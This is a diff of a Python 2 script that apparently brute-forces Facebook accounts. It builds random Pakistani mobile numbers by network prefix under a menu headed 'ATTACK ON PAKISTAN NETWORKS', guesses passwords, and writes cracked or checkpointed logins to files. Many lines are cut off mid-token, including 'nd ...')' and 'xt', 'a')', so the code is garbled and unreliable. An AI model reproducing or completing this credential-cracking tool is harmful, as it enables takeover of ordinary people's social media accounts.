@@ -1,10 +1,10 @@
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
 os.system('rm -rf .txt')
-for n in range(50000):
+
  
-    nmbr = random.randint(1111111, 9999999)
     
-    sys.stdout = open('.txt', 'a')
+    
+    )
  
     print(nmbr)
  
@@ -28,7 +28,7 @@ from mechanize import Browser
  
  
 reload(sys)
-sys.setdefaultencoding('utf8')
+
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
@@ -71,8 +71,8 @@ def menu():
 	print logo
 	print "\033[1;92mWELCOME TO ALL "
 	print
-        print "\033[1;91mATTACK ON PAKISTAN NETWORKS"
-	print "\033[1;92m[1]  MOBILINK"
+        
+	print "\033[1;92m[1
 	print "\033[1;92m[2]  TELINOR"
 	print "\033[1;92m[3]  WARID"
 	print "\033[1;92m[4]  UFONE"
@@ -104,7 +104,7 @@ def action():
 			raw_input("\n[ Back ]")
 			menu()
 	elif bch =="2":			
-		os.system("clear")
+		
 		print (logo)
 		print "\033[1;91mTELINORE CODE HERE"		
 		print "\033[1;94m40, 41, 42, 43, 44,"
@@ -123,11 +123,11 @@ def action():
 		os.system("clear")
 		print (logo)
 		print "\033[1;91mWARID CODE HERE"		
-		print "\033[1;94m20, 21, 22, 23,"
+		
 		print "\033[1;95m24, ??, ??, ??,"
 		try:
-			
-			k="+923"
+	
+	
 			idlist = ('.txt')
 			for line in open(idlist,"r").readlines():
 				id.append(line.strip())
@@ -192,7 +192,7 @@ def action():
 	time.sleep(0.5)
 	psb ('[✓] Please wait, process is running ...')
 	time.sleep(0.5)
-	psb ('[✓] Last 07 Digit Crack,000786,786000 Found ...')
+	nd ...')
 	time.sleep(0.5)
 	psb ('[!] Kalti Marne Ke lye(To Exit) Press CTRL Then Press z')
 	time.sleep(0.5)
@@ -220,7 +220,7 @@ def action():
 			else:
 				if 'www.facebook.com' in q['error_msg']:
 					print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1
-					cps = open('save/checkpoint.txt', 'a')
+					xt', 'a')
 					cps.write(k+c+user+'|'+pass1+'\n')
 					cps.close()
 					cpb.append(c+user+pass1)
